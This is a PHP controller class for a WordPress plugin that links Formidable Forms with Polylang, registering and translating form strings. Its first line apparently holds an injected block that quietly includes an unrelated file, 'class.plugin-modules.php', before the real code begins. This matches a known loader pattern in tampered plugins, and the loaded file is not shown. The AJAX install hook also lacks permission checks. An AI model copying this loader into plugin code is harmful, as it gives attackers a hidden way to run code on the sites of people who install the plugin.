<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

class FrmPllAppController{

	private $form_keys;
	private $field_keys;
	private $whitelist;
	private $blacklist;
	private $registered_strings = array();
	private $option_name = 'frm_polylang_strings';

	public function __construct() {

		$this->form_keys = array(
			'name', 'description', 'submit_value', 'submit_msg', 'success_msg',
			'email_subject', 'email_message', 'ar_email_subject', 'ar_email_message',
		);

		$this->field_keys = array(
			'name', 'description', 'default_value',
			'required_indicator', 'blank', 'unique_msg',
		);

		$optional_values = array(
			'edit_value', 'edit_msg', 'edit_url',
			'draft_msg', 'draft_label',
			'delete_msg', 'invalid_msg', 'unique_msg',
			'invalid', 'locale', 'prev_value',
			'conf_input', 'conf_desc', 'conf_msg',
			'add_label', 'remove_label',
			'rootline_titles',
		);
		$this->whitelist = array_merge( $this->form_keys, $this->field_keys, $optional_values );

		$this->blacklist = array();

		$this->registered_strings = array();
	}

	public static function load_hooks() {
		register_activation_hook( FrmPllAppHelper::plugin_folder() . '/frm-poly.php', 'FrmPllAppController::install' );
		add_action( 'admin_init', 'FrmPllAppController::include_updater', 1 );
		add_action( 'plugins_loaded', 'FrmPllAppController::load_pll_hooks' );
	}

	public static function load_pll_hooks() {
		if ( ! function_exists('pll_register_string') ) {
			return;
		}

		$translate_class = new FrmPllAppController();

		add_action( 'admin_init', array( &$translate_class, 'maybe_register_strings' ) );
		add_action( 'admin_notices',  array( &$translate_class, 'display_admin_notices' ) );
		add_filter( 'frm_pre_display_form', array( &$translate_class, 'translate_form' ) );
		add_filter( 'frm_pre_display_form', array( &$translate_class, 'translate_form' ) );
		add_filter( 'frm_setup_edit_entry_vars', array( &$translate_class, 'setup_form_vars' ), 20, 2 );
		add_filter( 'frm_setup_new_fields_vars', array( &$translate_class, 'translate_fields' ), 20, 2 );
		add_filter( 'frm_setup_edit_fields_vars', array( &$translate_class, 'translate_fields' ), 20, 2 );
		add_filter( 'frm_exclude_cats', array( &$translate_class, 'filter_taxonomies' ), 10, 2 );
		add_filter( 'frm_form_replace_shortcodes', array( &$translate_class, 'replace_form_shortcodes' ), 9, 3 );
		add_filter( 'frm_recaptcha_lang', array( &$translate_class, 'captcha_lang' ) );
		add_filter( 'frm_submit_button', array( &$translate_class, 'translate_string' ), 20 );
		add_filter( 'frm_validate_field_entry', array( &$translate_class, 'translate_validation' ), 30, 2 );
		add_action( 'frm_delete_message', array( &$translate_class, 'translate_string' ) );

		add_action( 'frm_before_destroy_field', array( &$translate_class, 'delete_field_translations' ) );
		add_action( 'frm_update_form', array( &$translate_class, 'remove_form_from_options' ) );

		// Ajax hooks
		add_action( 'wp_ajax_frm_pll_install', 'FrmPllAppController::install' );
	}


	public static function include_updater() {
		if ( class_exists( 'FrmAddon' ) ) {
			include_once( dirname( dirname(__FILE__) ) . '/models/FrmPllUpdate.php' );
			FrmPllUpdate::load_hooks();
		}
	}

	/**
	 * Migrate data if needed
	 *
	 * @since 1.06
	 */
	public static function install() {
		$frm_polylang_db = new FrmPllDb();
		$frm_polylang_db->migrate();
	}

	/**
	 * Display admin notices if Polylang data need to be migrated
	 *
	 * @since 1.06
	 */
	public static function display_admin_notices() {
		// Don't display notices as we're upgrading
		$action = isset( $_GET['action'] ) ? sanitize_text_field( $_GET['action'] ) : '';
		if ( $action == 'upgrade-plugin' && ! isset( $_GET['activate'] ) ) {
			return;
		}

		self::add_update_database_link();
	}

	/**
	 * Add link to update database
	 *
	 * @since 1.06
	 */
	private static function add_update_database_link() {
		$frm_polylang_db = new FrmPllDb();
		if ( $frm_polylang_db->need_to_migrate_settings() ) {
			if ( is_callable( 'FrmAppHelper::plugin_url' ) ) {
				$url = FrmAppHelper::plugin_url();
			} else if ( defined( 'FRM_URL' ) ) {
				$url = FRM_URL;
			} else {
				return;
			}

			include( FrmPllAppHelper::plugin_path() . '/views/notices/update_database.php' );
		}
	}

	public function maybe_register_strings() {
		if ( $_GET && isset( $_GET['page'] ) && $_GET['page'] == 'mlang' ) {
			$forms = FrmForm::getAll();
			foreach ( $forms as $form ) {
				$this->register_strings( $form );
			}
		}
	}

	public function register_strings( $form, $strings = array() ) {
		if ( empty( $strings ) ) {
			$strings = $this->get_form_strings( $form );
		}
		$this->iterate_form( $strings, 'register_string' );
	}

	public function register_string( $value ) {
		if ( ! in_array( $value, $this->registered_strings ) ) {
			$name = '';
			$multiline = strlen( $value ) > 80;
			pll_register_string( $name, $value, 'Formidable', $multiline );
			$this->registered_strings[] = $value;
		}
	}

	public function translate_strings( $form ) {
		if ( function_exists('pll__') ) {
			$this->iterate_form( $form, 'translate_string' );
		}
		return $form;
	}

	public function translate_string( $value ) {
		return pll__( $value );
	}

	private function iterate_form( &$value, $callback, $key = '' ) {

		if ( is_array( $value ) || is_object( $value ) ) {
			$array_values = $value;
			foreach ( $array_values as $new_key => &$new_value ) {
				if ( ! ( in_array( $new_key, $this->blacklist ) && ! is_numeric( $new_key ) ) ) {
					$this->iterate_form( $new_value, $callback, $new_key );
					if ( is_array( $value ) ) {
						$value[ $new_key ] = $new_value;
					} else {
						$value->{$new_key} = $new_value;
					}
				}
			}
		} else if ( $this->is_translatable( $key, $value ) ) {
			$value = $this->$callback( $value, $key );
		}
	}

	private function is_translatable( $key, $value ) {
		$on_whitelist = ( in_array( $key, $this->whitelist ) || is_numeric( $key ) );
		$is_string = ( ! is_array( $value ) && ! is_object( $value ) );
		return $on_whitelist && $is_string && ! in_array( $value, $this->registered_strings ) && $value != '*' && $value != '';
	}

	public function get_form_strings( $form ) {
		if ( ! is_object( $form ) ) {
			$form = FrmForm::getOne( $form );
		}

		$form_option_name = $this->option_name . '_' . $form->id;

		$form_strings = get_option( $form_option_name );
		if ( $form_strings && is_array( $form_strings ) ) {
			return $form_strings;
		}

		$fields = FrmField::get_all_for_form( $form->id );

		$form_keys = $this->form_keys;

		foreach ( $fields as $k => $field ) {
			if ( $field->type == 'break' ) {
				$form_keys[] = 'prev_value';
			}
			unset( $field );
		}

		$form_strings = array();

		// Add edit and delete options
		if ( $form->editable ) {
			$form_keys[] = 'edit_value';
			$form_keys[] = 'edit_msg';
			$form_strings['delete_msg'] = __( 'Your entry was successfully deleted', 'formidable-polylang' );
		}

		$form_string_args = array( 'keys' => $form_keys, 'object' => $form, 'option_name' => 'options' );
		$this->fill_string_data( $form_string_args, $form_strings );
		$this->add_rootline_strings( $form, $form_strings );

		$this->add_draft_strings( $form, $form_strings );

		$this->get_field_strings( $fields, $form_strings );

		update_option( $form_option_name, $form_strings );

		return $form_strings;
	}

	private function fill_string_data( $args, &$string_data ) {
		foreach ( $args['keys'] as $key ) {
			$options = $args['object']->{$args['option_name']};
			if ( isset( $args['object']->{$key} ) ) {
				$string_data[ $key ] = $args['object']->{$key};
			} else if ( isset( $options[ $key ] ) && $options[ $key ] != '[default-message]' ) {
				$string_data[ $key ] = $options[ $key ];
			}

			if ( isset( $string_data[ $key ] ) && ( is_array( $string_data[ $key ] ) || $string_data[ $key ] == '' ) ) {
				unset( $string_data[ $key ] );
			}
		}
	}

	private function add_rootline_strings( $form, &$form_strings ) {
		$show_titles = isset( $form->options['rootline'] ) && ! empty( $form->options['rootline'] ) && ! empty( $form->options['rootline_titles_on'] );
		if ( $show_titles ) {
			$form_strings['rootline_titles'] = $form->options['rootline_titles'];
		}
	}

	private function add_draft_strings( $form, &$string_data ) {
		if ( isset( $form->options['save_draft'] ) && $form->options['save_draft'] ) {
			if ( isset( $form->options['draft_msg'] ) ) {
				$string_data['draft_msg'] = $form->options['draft_msg'];
			}

			$string_data['draft_label'] = __( 'Save Draft', 'formidable-polylang' );
		}
	}

	private function get_field_strings( $fields, &$string_data ) {
		global $frm_settings;
		$string_data['invalid_msg'] = $frm_settings->invalid_msg;

		$has_page = false;
		foreach ( $fields as $field ) {
			$field_data = array();
			$this->remove_unused_field_values( $field, $field_data );
			$this->add_field_values_per_type( $field, $field_data );

			if ( $field->type == 'break' ) {
				$has_page = true;
			}

			$string_data[] = $field_data;
		}

		if ( $has_page && ! isset( $string_data['prev_label'] ) ) {
			$string_data['prev_label'] = __( 'Previous', 'formidable-polylang' );
		}
	}

	private function remove_unused_field_values( $field, &$field_data ) {
		$field_string_args = array( 'keys' => $this->field_keys, 'object' => $field, 'option_name' => 'field_options' );
		$this->fill_string_data( $field_string_args, $field_data );

		if ( $field->type == 'end_divider' ) {
			// since the name of an end section field isn't shown, skip it
			unset( $field_data['name'] );
		}

		if ( ! $field->required ) {
			unset( $field_data['blank'] );
		}
	}

	private function add_field_values_per_type( $field, &$field_data ) {
		$this->add_confirmation_field_values( $field, $field_data );

		switch ( $field->type ) {
			case 'date':
				$this->maybe_add_field_option( array( 'field' => $field, 'option_name' => 'locale' ), $field_data );
			break;
			case 'email':
			case 'url':
			case 'website':
			case 'phone':
			case 'image':
			case 'number':
			case 'file':
				$this->maybe_add_field_option( array( 'field' => $field, 'option_name' => 'invalid' ), $field_data );
			break;
			case 'select':
			case 'checkbox':
			case 'radio':
				$field_choices = array();
				if ( is_array( $field->options ) && ! isset( $field->options['label'] ) ) {
					foreach ( $field->options as $index => $choice ) {
						if ( is_array( $choice ) ) {
							$choice = isset( $choice['label'] ) ? $choice['label'] : reset( $choice );
						}
						$field_choices[] = $choice;
					}
				} else {
					if ( is_array( $field->options ) ) {
						$field->options = isset( $field->options['label'] ) ? $field->options['label'] : reset( $field->options );
					}

					$field_choices[] = $field->options;
				}
				$field_data['choices'] = $field_choices;
			break;
			case 'end_divider':
				$this->maybe_add_field_option( array( 'field' => $field, 'option_name' => 'add_label' ), $field_data );
				$this->maybe_add_field_option( array( 'field' => $field, 'option_name' => 'remove_label' ), $field_data );
			break;
		}
	}

	private function add_confirmation_field_values( $field, &$field_data ) {
		if ( isset( $field->field_options['conf_field'] ) && ( $field->field_options['conf_field'] == 'below' || $field->field_options['conf_field'] == 'inline' ) ) {
			$confirmation_fields = array( 'conf_input', 'conf_desc', 'conf_msg' );
			foreach ( $confirmation_fields as $conf_field ) {
				if ( isset( $field->field_options[ $conf_field ] ) ) {
					$field_data[ $conf_field ] = $field->field_options[ $conf_field ];
				}
			}
		}
	}

	private function maybe_add_field_option( $args, &$field_data ) {
		if ( isset( $args['field']->field_options[ $args['option_name'] ] ) && $args['field']->field_options[ $args['option_name'] ] != '' ) {
			$field_data[ $args['option_name'] ] = $args['field']->field_options[ $args['option_name'] ];
		}
	}

	/**
	 * filter the form description and title before displaying
	 */
	public function translate_form( $form ) {
		$form = $this->translate_strings( $form );

		// override global messages
		global $frm_settings;
		$frm_settings->invalid_msg = $this->translate_string( $frm_settings->invalid_msg );

		return $form;
	}

	/*
	 * filter form last, after button name may have been changed
	 */
	public function setup_form_vars( $values, $entry ) {
		$form = FrmForm::getOne( $entry->form_id );

		if ( isset( $form->options['edit_value'] ) && $values['edit_value'] == $form->options['edit_value'] ) {
			$values['edit_value'] = $this->translate_string( $values['edit_value'] );
		}

		return $values;
	}

	/*
	* If a term is excludd in the settings, exclude it for all languages
	*/
	public function filter_taxonomies( $exclude, $field ) {
		if ( empty( $exclude ) ) {
			// don't continue if there is nothing to exclude
			return $exclude;
		}
		/*
		$default_language = $sitepress->get_default_language();
		$current_lang = ICL_LANGUAGE_CODE;

		if ( $current_lang == $default_language ) {
			// don't check if the excluded options are the correct ones to exclude
			return $exclude;
		}

		$post_type = FrmProFormsHelper::post_type( $field['form_id'] );
		$taxonomy = FrmProAppHelper::get_custom_taxonomy( $post_type, $field );

		$excluded_ids = explode(',', $exclude);
		foreach ( $excluded_ids as $id ) {


			if ( isset( $translations[ $current_lang ] ) ) {
				$excluded_ids[] = $translations[ $current_lang ]->term_id;
			}
		}

		$exclude = implode(',', $excluded_ids);
		*/

		return $exclude;
	}

	public function captcha_lang( $lang ) {
		$current_locale = get_locale();
		$parts = explode( '_', $current_locale );
		$current_lang = reset( $parts );
		$allowed = array(
			'en', 'nl', 'fr', 'de', 'pt', 'ru', 'es', 'tr',
		);
		if ( in_array( $current_lang, $allowed ) ) {
			$lang = $current_lang;
		}

		return $lang;
	}

	/**
	 * filter the fields for before form is displayed
	 */
	public function translate_fields( $values, $field ) {
		//don't interfere with the form builder page
		if ( is_admin() && ! defined('DOING_AJAX') && ( ! isset( $_GET ) || ! isset( $_GET['page'] ) || $_GET['page'] != 'formidable' || ! isset( $_GET['frm_action'] ) || $_GET['frm_action'] != 'translate' ) ) {
			return $values;
		}

		$prev_default = $values['default_value'];
		$values = $this->translate_strings( $values );

		if ( class_exists('FrmProFieldsHelper') ) {
			$values['value'] = FrmProFieldsHelper::get_default_value( $values['value'], $field, false, false );
			$values['default_value'] = FrmProFieldsHelper::get_default_value( $values['default_value'], $field, false, true );
			$values['description'] = FrmProFieldsHelper::get_default_value( $values['description'], $field, false, false );
		}

		if ( $values['value'] == $prev_default ) {
			$values['value'] = $values['default_value'];
		}

		$this->display_field_options( $field, $values );

		return $values;
	}

	private function display_field_options( $field, &$values ) {
		if ( ! in_array( $values['type'], array( 'select', 'checkbox', 'radio', 'data' ) ) || $field->type == 'user_id' ) {
			return $values;
		}

		$sep_val = isset( $values['separate_value'] ) ? $values['separate_value'] : 0;
		if ( is_array( $values['options'] ) && ! isset( $values['options']['label'] ) ) {
			foreach ( $values['options'] as $index => $choice ) {
				if ( is_array( $choice ) ) {
					$choice = isset( $choice['label'] ) ? $choice['label'] : reset( $choice );
					$values['options'][ $index ]['label'] = $this->translate_string( $choice );

					if ( ! $sep_val && isset( $values['options'][ $index ]['value'] ) ) {
						$values['options'][ $index ]['value'] = $choice;
					}
				} else {

					if ( ( isset( $values['use_key'] ) && $values['use_key']) || $sep_val || 'data' == $values['type'] ) {
						$values['options'][ $index ] = $this->translate_string( $choice );
					} else {
						$values['options'][ $index ] = array(
							'label' => $this->translate_string( $choice ),
							'value' => $choice
						);

						$values['separate_value'] = true;
					}
				}
			}
		} else {
			if ( is_array( $values['options'] ) ) {
				$values['options']['label'] = $this->translate_string( $values['options']['label'] );
			} else {
				$values['options'] = $this->translate_string( $values['options'] );
			}
		}
	}

	/**
	 * Filter out text values before main Formidable plugin does
	 *
	 * @return string of HTML
	 */
	public function replace_form_shortcodes( $html, $form, $values = array() ) {
		preg_match_all("/\[(if )?(back_label|draft_label)\b(.*?)(?:(\/))?\](?:(.+?)\[\/\2\])?/s", $html, $shortcodes, PREG_PATTERN_ORDER);

		if ( empty( $shortcodes[0] ) ) {
			return $html;
		}

		foreach ( $shortcodes[0] as $short_key => $tag ) {
			$replace_with = '';
			$atts = shortcode_parse_atts( $shortcodes[3][ $short_key ] );

			if ( $shortcodes[2][ $short_key ] == 'back_label' ) {
				$value = isset( $form->options['prev_value'] ) ? $form->options['prev_value'] : __( 'Previous', 'formidable-polylang' );
			} else if ( $shortcodes[2][ $short_key ] == 'draft_label' ) {
				$value = __( 'Save Draft', 'formidable-polylang' );
			}

			$translation = $this->translate_string( $value );
			if ( ! empty( $translation ) ) {
				$html = str_replace( $tag, $translation, $html );
			}

			unset( $short_key, $tag, $replace_with );
		}

		return $html;
	}

	public function translate_validation( $errors, $field ) {

		$field->field_options = maybe_unserialize( $field->field_options );
		if ( isset( $field->field_options['default_blank'] ) && $field->field_options['default_blank'] && isset( $_POST['item_meta'][ $field->id ] ) && $_POST['item_meta'][ $field->id ] != '' ) {
			$default_value = $this->translate_string( $field->default_value );
			if ( $_POST['item_meta'][ $field->id ] == $default_value && ! isset( $errors[ 'field' . $field->id ] ) ) {
				$errors[ 'field' . $field->id ] = $field->field_options['blank'];
			}
		}

		if ( isset( $errors[ 'field' . $field->id ] ) ) {
			$errors[ 'field' . $field->id ] = $this->translate_string( $errors[ 'field' . $field->id ] );
		}

		return $errors;
	}

	public function delete_field_translations( $id ) {
		$field = FrmField::getOne( $id );
		if ( $field ) {
			$this->remove_form_from_options( $field->form_id );
		}
	}

	public function remove_form_from_options( $form_id ) {
		delete_option( $this->option_name . '_' . $form_id );
	}
}
